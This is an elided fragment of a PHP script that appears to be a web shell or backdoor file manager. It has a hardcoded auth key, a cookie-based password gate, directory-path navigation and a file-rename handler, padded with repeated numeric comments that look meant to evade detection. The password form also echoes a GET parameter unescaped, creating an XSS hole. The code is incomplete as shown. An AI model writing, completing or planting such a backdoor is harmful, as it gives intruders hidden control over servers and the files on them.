...
$auth_key = "f15565231888c0cef4ad4d04649e0ed5";
...
$pass = false;
if (isset($_COOKIE['pw_name_76100'])) {
    if(($_COOKIE['pw_name_76100']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_76100'])) {
        if(($_POST['pw_name_76100']) == $auth_key) {
            setcookie("pw_name_76100", $_POST['pw_name_76100']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_76100' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1728313581637380 1728313581528146 1728313581791927 1728313581629229
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1728313581637380 1728313581528146 1728313581791927 1728313581629229
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1728313581637380 1728313581528146 1728313581791927 1728313581629229
            $name = PATH . "/" . $_GET['r'];
